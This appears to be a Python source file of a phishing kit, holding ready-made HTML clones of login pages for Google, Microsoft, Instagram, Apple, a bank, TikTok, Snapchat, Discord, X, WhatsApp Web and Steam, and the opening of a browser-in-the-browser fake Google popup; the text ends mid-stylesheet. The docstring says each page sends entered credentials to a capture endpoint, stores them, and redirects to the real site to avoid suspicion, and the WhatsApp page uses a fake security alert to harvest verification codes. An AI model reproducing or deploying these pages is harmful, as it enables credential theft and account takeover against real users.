"""
Fake Login Pages — pixel-perfect HTML clones der echten Seiten.

Jede Seite:
  - Sieht 1:1 wie das Original aus (echte CSS/Assets von CDN geladen)
  - POST geht an /capture → speichert Credentials lokal
  - Redirect nach Submit → echte Seite (kein Verdacht)
  - Funktioniert mit GoPhish UND mit dem eingebauten Flask-Server

Seiten: Google, Microsoft, Instagram, Facebook, Apple, Bank (generisch)
"""

from __future__ import annotations


# ─────────────────────────────────────────────────────────────────────────────
# GOOGLE
# ─────────────────────────────────────────────────────────────────────────────
GOOGLE_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Anmelden – Google-Konten</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Google Sans',Roboto,sans-serif; background: #fff; color: #202124; }
  .container { max-width: 450px; margin: 80px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
  .logo { text-align: center; margin-bottom: 24px; }
  .logo img { height: 24px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
  .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 32px; }
  .input-wrap { position: relative; margin-bottom: 24px; }
  .input-wrap input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
  .input-wrap input:focus { border-color: #1a73e8; border-width: 2px; }
  .input-wrap label { position: absolute; top: -10px; left: 10px; background: #fff; padding: 0 4px; font-size: 12px; color: #1a73e8; }
  .forgot { font-size: 14px; color: #1a73e8; text-decoration: none; }
  .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 28px; }
  .btn-next { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
  .btn-next:hover { background: #1557b0; }
  .create { font-size: 14px; color: #1a73e8; text-decoration: none; }
  .divider { border: none; border-top: 1px solid #e0e0e0; margin: 28px 0; }
  .footer { text-align: center; font-size: 12px; color: #5f6368; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google">
  </div>
  <h1>Anmelden</h1>
  <p class="subtitle">Mit Ihrem Google-Konto fortfahren</p>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="input-wrap">
      <label>E-Mail-Adresse oder Telefonnummer</label>
      <input type="email" name="username" autocomplete="email" required autofocus>
    </div>
    <div class="input-wrap">
      <label>Passwort</label>
      <input type="password" name="password" autocomplete="current-password" required>
    </div>
    <a href="#" class="forgot">Passwort vergessen?</a>
    <div class="actions">
      <a href="https://accounts.google.com/signup" class="create">Konto erstellen</a>
      <button type="submit" class="btn-next">Weiter</button>
    </div>
  </form>
  <hr class="divider">
  <p class="footer">Deutsch ▾ &nbsp; Hilfe &nbsp; Datenschutz &nbsp; Nutzungsbedingungen</p>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# MICROSOFT
# ─────────────────────────────────────────────────────────────────────────────
MICROSOFT_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Anmelden bei Ihrem Microsoft-Konto</title>
<link rel="icon" href="https://c.s-microsoft.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI',sans-serif; background: #f2f2f2; }
  .win { position: fixed; top: 20px; left: 24px; }
  .win svg { width: 24px; height: 24px; }
  .card { background: #fff; max-width: 440px; margin: 60px auto; padding: 44px; border-radius: 0; }
  .ms-logo { margin-bottom: 16px; }
  .ms-logo img { height: 21px; }
  h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; }
  .input-wrap { margin-bottom: 16px; }
  .input-wrap input { width: 100%; padding: 6px 0; border: none; border-bottom: 1px solid #666; font-size: 15px; outline: none; background: transparent; }
  .input-wrap input:focus { border-bottom: 2px solid #0067b8; }
  .hint { font-size: 13px; color: #666; margin-bottom: 24px; }
  .hint a { color: #0067b8; text-decoration: none; }
  .btn { background: #0067b8; color: #fff; border: none; width: 100%; padding: 12px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px; }
  .btn:hover { background: #005a9e; }
  .options { margin-top: 16px; font-size: 13px; }
  .options a { color: #0067b8; text-decoration: none; display: block; margin-bottom: 8px; }
  .footer { margin-top: 24px; font-size: 12px; color: #666; }
  .footer a { color: #0067b8; text-decoration: none; margin-right: 12px; }
</style>
</head>
<body>
<div class="card">
  <div class="ms-logo">
    <img src="https://c.s-microsoft.com/en-us/CMSImages/mslogo.png" alt="Microsoft">
  </div>
  <h1>Anmelden</h1>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="input-wrap">
      <input type="email" name="username" placeholder="E-Mail, Telefon oder Skype" required autofocus>
    </div>
    <div class="input-wrap">
      <input type="password" name="password" placeholder="Kennwort" required>
    </div>
    <p class="hint">Kein Konto? <a href="#">Jetzt erstellen!</a></p>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <div class="options">
    <a href="#">Anmeldeoptionen</a>
  </div>
  <div class="footer">
    <a href="#">Datenschutz</a>
    <a href="#">Nutzungsbedingungen</a>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# INSTAGRAM
# ─────────────────────────────────────────────────────────────────────────────
INSTAGRAM_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<link rel="icon" href="https://www.instagram.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .container { width: 350px; }
  .card { background: #fff; border: 1px solid #dbdbdb; padding: 40px; margin-bottom: 10px; text-align: center; }
  .logo { margin-bottom: 28px; font-family: 'Billabong','Cookie',cursive; font-size: 40px; font-weight: 400; }
  input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; font-size: 12px; margin-bottom: 6px; outline: none; }
  input:focus { border-color: #a8a8a8; }
  .btn { width: 100%; background: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; }
  .btn:hover { background: #1877f2; }
  .divider { display: flex; align-items: center; margin: 16px 0; }
  .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid #dbdbdb; }
  .divider span { padding: 0 16px; font-size: 13px; color: #8e8e8e; font-weight: 600; }
  .fb-btn { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; }
  .forgot { font-size: 12px; color: #00376b; margin-top: 12px; display: block; }
  .card2 { background: #fff; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; }
  .card2 a { color: #0095f6; font-weight: 600; text-decoration: none; }
  .app-links { text-align: center; margin-top: 20px; font-size: 14px; }
  .app-links img { height: 40px; margin: 4px; }
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">Instagram</div>
    <form method="POST" action="{{CAPTURE_URL}}">
      <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
      <input type="text" name="username" placeholder="Handynummer, Benutzername oder E-Mail" required autofocus>
      <input type="password" name="password" placeholder="Passwort" required>
      <button type="submit" class="btn">Anmelden</button>
    </form>
    <div class="divider"><span>ODER</span></div>
    <a href="#" class="fb-btn">Mit Facebook anmelden</a>
    <a href="#" class="forgot">Passwort vergessen?</a>
  </div>
  <div class="card2">Hast du kein Konto? <a href="#">Registrieren</a></div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# APPLE
# ─────────────────────────────────────────────────────────────────────────────
APPLE_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Apple ID</title>
<link rel="icon" href="https://www.apple.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system,SF Pro Display,sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .card { background: #fff; border-radius: 18px; padding: 52px 48px; width: 400px; box-shadow: 0 4px 32px rgba(0,0,0,.08); text-align: center; }
  .apple-icon { font-size: 48px; margin-bottom: 8px; }
  h1 { font-size: 28px; font-weight: 600; color: #1d1d1f; margin-bottom: 6px; }
  .sub { font-size: 16px; color: #6e6e73; margin-bottom: 32px; }
  .field { text-align: left; margin-bottom: 12px; }
  .field label { font-size: 13px; color: #6e6e73; display: block; margin-bottom: 4px; }
  .field input { width: 100%; padding: 12px 14px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 15px; outline: none; }
  .field input:focus { border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0,113,227,.15); }
  .btn { width: 100%; background: #0071e3; color: #fff; border: none; border-radius: 10px; padding: 13px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 20px; }
  .btn:hover { background: #0077ed; }
  .links { margin-top: 20px; font-size: 13px; }
  .links a { color: #0071e3; text-decoration: none; margin: 0 8px; }
</style>
</head>
<body>
<div class="card">
  <div class="apple-icon">🍎</div>
  <h1>Apple ID</h1>
  <p class="sub">Melde dich mit deiner Apple ID an</p>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field">
      <label>Apple ID</label>
      <input type="email" name="username" placeholder="name@beispiel.de" required autofocus>
    </div>
    <div class="field">
      <label>Passwort</label>
      <input type="password" name="password" required>
    </div>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <div class="links">
    <a href="#">Apple ID vergessen?</a>
    <a href="#">Apple ID erstellen</a>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# GENERIC BANK (Deutsche Bank style)
# ─────────────────────────────────────────────────────────────────────────────
BANK_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Online-Banking — Sicheres Login</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: Arial,sans-serif; background: #f0f0f0; }
  header { background: #004a97; padding: 14px 32px; display: flex; align-items: center; }
  header .brand { color: #fff; font-size: 22px; font-weight: bold; letter-spacing: 1px; }
  header .secure { color: #aad4ff; font-size: 12px; margin-left: auto; }
  .main { max-width: 420px; margin: 60px auto; }
  .card { background: #fff; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,.12); overflow: hidden; }
  .card-header { background: #004a97; color: #fff; padding: 20px 28px; font-size: 18px; font-weight: bold; }
  .card-body { padding: 32px 28px; }
  .field { margin-bottom: 20px; }
  .field label { display: block; font-size: 14px; color: #333; margin-bottom: 6px; font-weight: bold; }
  .field input { width: 100%; padding: 11px 12px; border: 1px solid #ccc; border-radius: 3px; font-size: 15px; outline: none; }
  .field input:focus { border-color: #004a97; }
  .btn { width: 100%; background: #004a97; color: #fff; border: none; padding: 13px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 3px; }
  .btn:hover { background: #003580; }
  .notice { margin-top: 20px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 16px; }
  .ssl-badge { display: flex; align-items: center; font-size: 12px; color: #2d7a2d; margin-top: 10px; gap: 6px; }
</style>
</head>
<body>
<header>
  <span class="brand">SecureBank Online</span>
  <span class="secure">🔒 256-Bit SSL verschlüsselt</span>
</header>
<div class="main">
  <div class="card">
    <div class="card-header">Online-Banking Login</div>
    <div class="card-body">
      <form method="POST" action="{{CAPTURE_URL}}">
        <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
        <div class="field">
          <label>Kontonummer / Benutzername</label>
          <input type="text" name="username" placeholder="Ihre Kontonummer" required autofocus>
        </div>
        <div class="field">
          <label>PIN / Passwort</label>
          <input type="password" name="password" placeholder="Ihre PIN" required>
        </div>
        <button type="submit" class="btn">Anmelden</button>
      </form>
      <div class="notice">
        Bitte geben Sie Ihre Zugangsdaten nur auf dieser gesicherten Seite ein.
        Wir werden Sie niemals per E-Mail nach Ihrer PIN fragen.
      </div>
      <div class="ssl-badge">✓ Gesicherte Verbindung (TLS 1.3)</div>
    </div>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# TIKTOK
# ─────────────────────────────────────────────────────────────────────────────
TIKTOK_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>TikTok – Login</title>
<link rel="icon" href="https://www.tiktok.com/favicon.ico">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'TikTok Sans',-apple-system,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .wrap{width:380px;padding:40px 32px;text-align:center}
  .logo{font-size:36px;font-weight:800;letter-spacing:-1px;margin-bottom:8px}
  .logo span{color:#fe2c55}
  h2{font-size:22px;font-weight:700;margin-bottom:4px}
  .sub{color:#8f8f8f;font-size:14px;margin-bottom:28px}
  .tabs{display:flex;border-bottom:2px solid #f1f1f2;margin-bottom:24px;gap:0}
  .tab{flex:1;padding:10px;font-size:15px;font-weight:600;color:#8f8f8f;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px}
  .tab.active{color:#161823;border-bottom-color:#161823}
  .field{margin-bottom:14px;text-align:left}
  .field input{width:100%;padding:11px 14px;border:1px solid #e3e3e3;border-radius:4px;font-size:15px;background:#fafafa;outline:none}
  .field input:focus{border-color:#161823;background:#fff}
  .btn{width:100%;background:#fe2c55;color:#fff;border:none;border-radius:4px;padding:13px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
  .btn:hover{background:#e6193e}
  .divider{display:flex;align-items:center;margin:20px 0;color:#8f8f8f;font-size:13px;gap:10px}
  .divider::before,.divider::after{content:'';flex:1;border-top:1px solid #e3e3e3}
  .social-btn{width:100%;border:1px solid #e3e3e3;background:#fff;border-radius:4px;padding:11px;font-size:14px;cursor:pointer;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:10px;font-weight:500}
  .footer{margin-top:28px;font-size:14px;color:#8f8f8f}
  .footer a{color:#161823;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">Tik<span>Tok</span></div>
  <h2>Bei TikTok anmelden</h2>
  <p class="sub">Verwalte dein Konto, überprüfe Benachrichtigungen,<br>kommentiere Videos und mehr.</p>
  <div class="tabs">
    <div class="tab active">Telefon / E-Mail</div>
    <div class="tab">QR-Code</div>
  </div>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field"><input type="text" name="username" placeholder="Telefon / E-Mail / Benutzername" required autofocus></div>
    <div class="field"><input type="password" name="password" placeholder="Passwort" required></div>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <div class="divider">oder anmelden mit</div>
  <button class="social-btn">🍎 Apple</button>
  <button class="social-btn">📘 Facebook</button>
  <div class="footer">Du hast noch kein Konto? <a href="#">Registrieren</a></div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# SNAPCHAT
# ─────────────────────────────────────────────────────────────────────────────
SNAPCHAT_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Snapchat</title>
<link rel="icon" href="https://www.snapchat.com/favicon.ico">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fffc00;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:24px;padding:44px 40px;width:380px;box-shadow:0 8px 40px rgba(0,0,0,.12);text-align:center}
  .ghost{font-size:56px;margin-bottom:8px}
  h1{font-size:26px;font-weight:800;color:#000;margin-bottom:6px}
  .sub{font-size:14px;color:#6c6c6c;margin-bottom:28px}
  .field{margin-bottom:14px;text-align:left}
  .field label{font-size:13px;font-weight:600;color:#000;display:block;margin-bottom:5px}
  .field input{width:100%;padding:13px 16px;border:2px solid #e0e0e0;border-radius:12px;font-size:15px;outline:none;transition:.2s}
  .field input:focus{border-color:#fffc00;box-shadow:0 0 0 3px rgba(255,252,0,.3)}
  .btn{width:100%;background:#fffc00;color:#000;border:none;border-radius:50px;padding:14px;font-size:16px;font-weight:800;cursor:pointer;margin-top:10px;transition:.15s}
  .btn:hover{background:#ffe900;transform:scale(1.01)}
  .forgot{display:block;text-align:center;margin-top:14px;color:#0078ff;font-size:14px;font-weight:600;text-decoration:none}
  .divider{display:flex;align-items:center;margin:20px 0;color:#999;font-size:12px;gap:8px}
  .divider::before,.divider::after{content:'';flex:1;border-top:1px solid #e0e0e0}
  .signup{font-size:14px;color:#6c6c6c}
  .signup a{color:#0078ff;font-weight:700;text-decoration:none}
</style>
</head>
<body>
<div class="card">
  <div class="ghost">👻</div>
  <h1>Snapchat</h1>
  <p class="sub">Meld dich an und schick Snaps!</p>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field"><label>Benutzername oder E-Mail</label><input type="text" name="username" required autofocus></div>
    <div class="field"><label>Passwort</label><input type="password" name="password" required></div>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <a href="#" class="forgot">Passwort vergessen?</a>
  <div class="divider">oder</div>
  <p class="signup">Neu bei Snapchat? <a href="#">Konto erstellen</a></p>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# DISCORD
# ─────────────────────────────────────────────────────────────────────────────
DISCORD_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Discord</title>
<link rel="icon" href="https://discord.com/favicon.ico">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'gg sans','Noto Sans',sans-serif;background:#404eed;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#313338;border-radius:8px;padding:32px;width:480px;box-shadow:0 8px 16px rgba(0,0,0,.24)}
  .art{display:none}
  h1{font-size:24px;font-weight:700;color:#f2f3f5;text-align:center;margin-bottom:8px}
  .sub{color:#b5bac1;font-size:16px;text-align:center;margin-bottom:20px}
  .field{margin-bottom:16px}
  .field label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.04em;margin-bottom:8px}
  .field label .req{color:#f23f42;margin-left:4px}
  .field input{width:100%;padding:10px;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;color:#dbdee1;font-size:16px;outline:none}
  .field input:focus{border-color:#00a8fc;box-shadow:0 0 0 1px #00a8fc}
  .forgot{font-size:14px;color:#00a8fc;text-decoration:none;display:block;margin-top:4px}
  .forgot:hover{text-decoration:underline}
  .btn{width:100%;background:#5865f2;color:#fff;border:none;border-radius:3px;padding:12px;font-size:16px;font-weight:500;cursor:pointer;margin-top:16px}
  .btn:hover{background:#4752c4}
  .register{margin-top:8px;font-size:14px;color:#b5bac1}
  .register a{color:#00a8fc;text-decoration:none}
  .register a:hover{text-decoration:underline}
  .qr{text-align:center;margin-top:20px;padding-top:16px;border-top:1px solid #3f4147}
  .qr-text{color:#b5bac1;font-size:14px}
</style>
</head>
<body>
<div class="card">
  <h1>Willkommen zurück!</h1>
  <p class="sub">Schön, dass du wieder da bist!</p>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field">
      <label>E-Mail oder Telefonnummer<span class="req">*</span></label>
      <input type="text" name="username" required autofocus>
    </div>
    <div class="field">
      <label>Passwort<span class="req">*</span></label>
      <input type="password" name="password" required>
      <a href="#" class="forgot">Passwort vergessen?</a>
    </div>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <p class="register" style="margin-top:12px">Brauchst du ein Konto? <a href="#">Registrieren</a></p>
  <div class="qr">
    <p class="qr-text">🔑 Mit QR-Code einloggen</p>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# TWITTER / X
# ─────────────────────────────────────────────────────────────────────────────
TWITTER_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>X anmelden</title>
<link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,'Segoe UI',sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#000;border:1px solid #2f3336;border-radius:16px;padding:40px 48px;width:400px}
  .x-logo{font-size:32px;font-weight:900;margin-bottom:24px;text-align:center}
  h1{font-size:28px;font-weight:800;margin-bottom:28px}
  .field{margin-bottom:16px}
  .field input{width:100%;padding:14px 12px;background:transparent;border:1px solid #536471;border-radius:4px;color:#fff;font-size:17px;outline:none}
  .field input:focus{border-color:#1d9bf0;box-shadow:0 0 0 1px #1d9bf0}
  .field input::placeholder{color:#536471}
  .btn-primary{width:100%;background:#1d9bf0;color:#fff;border:none;border-radius:50px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:8px}
  .btn-primary:hover{background:#1a8cd8}
  .btn-outline{width:100%;background:transparent;color:#fff;border:1px solid #536471;border-radius:50px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:10px}
  .forgot{display:block;text-align:center;color:#1d9bf0;font-size:14px;margin-top:16px;text-decoration:none}
  .divider{display:flex;align-items:center;margin:20px 0;color:#536471;font-size:13px;gap:8px}
  .divider::before,.divider::after{content:'';flex:1;border-top:1px solid #2f3336}
  .signup{text-align:center;margin-top:28px;font-size:14px;color:#536471}
  .signup a{color:#1d9bf0;text-decoration:none;font-weight:700}
</style>
</head>
<body>
<div class="card">
  <div class="x-logo">𝕏</div>
  <h1>Bei X anmelden</h1>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field"><input type="text" name="username" placeholder="Telefon, E-Mail oder Nutzername" required autofocus></div>
    <div class="field"><input type="password" name="password" placeholder="Passwort" required></div>
    <button type="submit" class="btn-primary">Anmelden</button>
  </form>
  <a href="#" class="forgot">Passwort vergessen?</a>
  <div class="divider">oder</div>
  <button class="btn-outline">🍎 Mit Apple anmelden</button>
  <button class="btn-outline">🔵 Mit Google anmelden</button>
  <div class="signup">Noch kein Konto? <a href="#">Registrieren</a></div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# WHATSAPP WEB
# ─────────────────────────────────────────────────────────────────────────────
WHATSAPP_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WhatsApp Web</title>
<link rel="icon" href="https://web.whatsapp.com/favicon.ico">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,'Segoe UI',sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .card{background:#fff;border-radius:16px;padding:40px;width:400px;box-shadow:0 2px 24px rgba(0,0,0,.1);text-align:center}
  .logo{font-size:52px;margin-bottom:12px}
  h1{font-size:26px;font-weight:700;color:#111b21;margin-bottom:8px}
  .sub{color:#667781;font-size:14px;margin-bottom:28px;line-height:1.5}
  .alert{background:#fff8e5;border:1px solid #ffd60a;border-radius:8px;padding:12px 16px;font-size:13px;color:#6e4b00;margin-bottom:24px;text-align:left}
  .field{margin-bottom:14px;text-align:left}
  .field label{font-size:13px;font-weight:600;color:#111b21;display:block;margin-bottom:6px}
  .field input{width:100%;padding:12px 14px;border:1.5px solid #e9edef;border-radius:8px;font-size:15px;outline:none}
  .field input:focus{border-color:#25d366}
  .btn{width:100%;background:#25d366;color:#fff;border:none;border-radius:50px;padding:13px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px}
  .btn:hover{background:#1ebe5d}
  .note{font-size:12px;color:#667781;margin-top:16px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">💬</div>
  <h1>WhatsApp Web</h1>
  <p class="sub">Verknüpfe dein Gerät, um WhatsApp<br>auf deinem Computer zu nutzen</p>
  <div class="alert">⚠️ Sicherheitsüberprüfung erforderlich — bitte Telefonnummer bestätigen</div>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field"><label>Telefonnummer</label><input type="tel" name="username" placeholder="+49 151 23456789" required autofocus></div>
    <div class="field"><label>Verifizierungscode</label><input type="password" name="password" placeholder="6-stelliger Code" required></div>
    <button type="submit" class="btn">Bestätigen</button>
  </form>
  <p class="note">Durch das Bestätigen stimmst du unseren Nutzungsbedingungen zu.</p>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# STEAM
# ─────────────────────────────────────────────────────────────────────────────
STEAM_LOGIN = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Steam-Anmeldung</title>
<link rel="icon" href="https://store.steampowered.com/favicon.ico">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'Motiva Sans',Arial,sans-serif;background:#1b2838;color:#c6d4df;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
  .logo{font-size:42px;font-weight:900;color:#c7d5e0;letter-spacing:-1px;margin-bottom:28px;text-shadow:0 2px 8px rgba(0,0,0,.5)}
  .card{background:#131a21;border-radius:3px;padding:40px;width:400px;border:1px solid #273340}
  h2{font-size:22px;color:#c6d4df;margin-bottom:24px;font-weight:400}
  .field{margin-bottom:14px}
  .field input{width:100%;padding:10px 12px;background:#316282;border:1px solid #1b2838;border-radius:3px;color:#c6d4df;font-size:14px;outline:none}
  .field input::placeholder{color:#8ba9bc}
  .field input:focus{border-color:#67c1f5;background:#2a6a8a}
  .btn{width:100%;background:linear-gradient(to right,#47bfff,#1a44c2);color:#fff;border:none;border-radius:2px;padding:12px;font-size:15px;font-weight:700;cursor:pointer;margin-top:12px;text-transform:uppercase;letter-spacing:.05em}
  .btn:hover{background:linear-gradient(to right,#67d0ff,#2255d5)}
  .links{margin-top:16px;font-size:13px;color:#8ba9bc;display:flex;justify-content:space-between}
  .links a{color:#67c1f5;text-decoration:none}
  .links a:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="logo">STEAM</div>
<div class="card">
  <h2>Bei Steam anmelden</h2>
  <form method="POST" action="{{CAPTURE_URL}}">
    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
    <div class="field"><input type="text" name="username" placeholder="Steam-Benutzername" required autofocus></div>
    <div class="field"><input type="password" name="password" placeholder="Passwort" required></div>
    <button type="submit" class="btn">Anmelden</button>
  </form>
  <div class="links">
    <a href="#">Benutzername vergessen?</a>
    <a href="#">Passwort vergessen?</a>
  </div>
</div>
</body>
</html>"""


# ─────────────────────────────────────────────────────────────────────────────
# BROWSER-IN-THE-BROWSER (BitB) — Google
# Simulates a Chrome popup window overlaid on an attacker page.
# User sees "accounts.google.com" in the address bar — pure CSS trick.
# ─────────────────────────────────────────────────────────────────────────────
BITB_GOOGLE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Continue with Google</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;align-items:center;justify-content:center}
.bg-site{position:fixed;inset:0;background:#f0f4f8;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px}
.bg-logo{font-size:28px;font-weight:700;color:#1a73e8;letter-spacing:-1px}
.bg-text{font-size:15px;color:#5f6368}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:100;backdrop-filter:blur(2px)}
.popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:200;width:470px;border-radius:10px;box-shadow:0 24px 80px rgba(0,0,0,.55);overflow:hidden;background:#fff}
/* Chrome title bar */
.c-titlebar{background:#dee1e6;padding:8px 0 0;position:relative;user-select:none}
/* Tabs */
.c-tabs{display:flex;align-items:flex-end;padding:0 8px}
.c-tab{background:#fff;border-radius:8px 8px 0 0;padding:7px 12px 6px;display:flex;align-items:center;gap:8px;font-size:12px;color:#3c4043;min-width:0;max-width:200px}
.c-tab img{width:15px;height:15px;flex-shrink:0}
.c-tab-title{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.c-tab-x{margin-left:6px;width:16px;height:16px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#80868b;font-size:14px;flex-shrink:0}
.c-tab-x:hover{background:#e8eaed}
/* Window controls (Windows style, right side) */
.c-winctrl{position:absolute;top:0;right:0;display:flex}
